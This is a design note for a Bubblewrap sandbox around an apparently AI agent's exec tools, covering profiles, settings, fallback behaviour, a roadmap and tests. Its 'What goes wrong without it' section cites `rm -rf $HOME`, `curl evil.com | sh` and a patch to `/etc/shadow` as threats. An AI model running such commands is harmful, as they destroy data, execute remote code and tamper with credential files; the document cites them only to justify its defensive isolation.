# Sandbox v1 (Bubblewrap)

OS-level isolation for mathran's mutating exec tools (`bash`,
`run_python`, `run_latex`, `lean_check`). Inspired by Codex's
`codex-rs/sandbox-linux/` and Claude Code's `--sandbox` mode.

**Status:** v1 default-off. `bash` is wired; `run_python` / `run_latex`
/ `lean_check` are queued for v2 (raw spawn for now). Linux only —
macOS / Windows fall through to raw spawn with a one-time warning.

## Profiles (4)

| Profile | Workspace | System fs | `/tmp` | Network |
|---|---|---|---|---|
| `workspace-write` (default) | RW | RO (`/usr` `/etc` `~/.cache/uv` `~/.elan`) | tmpfs | **off** |
| `workspace-read` | RO | RO | tmpfs | **off** |
| `network` | RW | RO | tmpfs | on |
| `disabled` | (raw spawn, no isolation) |

Pick `workspace-write` for shell / build / test work. Pick `network`
for `search_web` / `web_fetch` (v2 — not wired yet). Pick
`workspace-read` for pure analysis tools. `disabled` is an explicit
escape hatch.

## Enabling

In `.mathran/settings.json`:

```json
{
  "sandbox": {
    "enabled": true,
    "defaultProfile": "workspace-write",
    "extraReadOnlyPaths": ["~/.cache/uv", "~/.elan"],
    "extraReadWritePaths": []
  }
}
```

Defaults if you omit fields:
- `enabled: false` — back-compat byte-for-byte (raw spawn everywhere).
- `defaultProfile: "workspace-write"`
- `extraReadOnlyPaths: []`, `extraReadWritePaths: []`

## How it engages

When `enabled: true`, every `spawnSandboxed()` call resolves to either:
1. `bwrap` invocation with the assembled argv (the profile dictates
   `--ro-bind` / `--bind` / `--unshare-net` / `--proc /proc` / `--tmpfs
   /tmp` / `--die-with-parent` flags), OR
2. raw spawn fallthrough with `console.warn` (once per process) — when
   bwrap is missing, OS is non-Linux, or `kind: "disabled"` is passed.

The returned `SandboxResult` carries a `mode: "bwrap" | "raw"` field
so logs / audits / tests can verify the sandbox actually engaged.

## What goes wrong without it

The tools spawn into the host shell. `bash` running `rm -rf $HOME` or
`curl evil.com | sh` succeeds; an `apply_patch` to `/etc/shadow` would
go through if the host runs as root. Sandbox-on contains all mutation
to the workspace + tmpfs.

## What still blocks

- Approval matrix (`tool_execution` channel)
- Standing rules (`approval.rules` deny entries)
- Permission profile `denylistTools`
- Hooks v1 `PreToolUse` block decisions

Sandbox is **defense in depth** on top of these — not a replacement.

## v2 roadmap

- Wire `run_python` / `run_latex` / `lean_check` (each needs custom
  RO binds for the interpreter / toolchain — `~/.elan` for Lean,
  `~/.cache/uv` for Python venvs, `/usr/share/texlive` for TeX Live).
- Wire `search_web` / `search_arxiv` / `web_fetch` to `network`
  profile.
- Landlock LSM v3 (Linux ≥ 6.14): per-path `LANDLOCK_ACCESS_FS_*`
  refinement on top of the namespace-level bind. Stricter; doesn't
  need root.
- macOS Seatbelt (`sandbox-exec` + `.sbpl` policy).

## Tests

`src/core/sandbox/__tests__/`:
- `bwrap.test.ts` — argv assembly correctness across profiles
- `detect.test.ts` — capability detection (bwrap presence, Linux)
- `settings.test.ts` — settings.json shape + defaults
- `wrapper.test.ts` — real spawn (`bwrap echo hi` allowed, `bwrap touch /etc/foo` denied) + timeouts + raw fallthrough

55/55 tests pass on the current Azure VM (Ubuntu 24.04, Linux 6.14,
`/usr/bin/bwrap` installed).
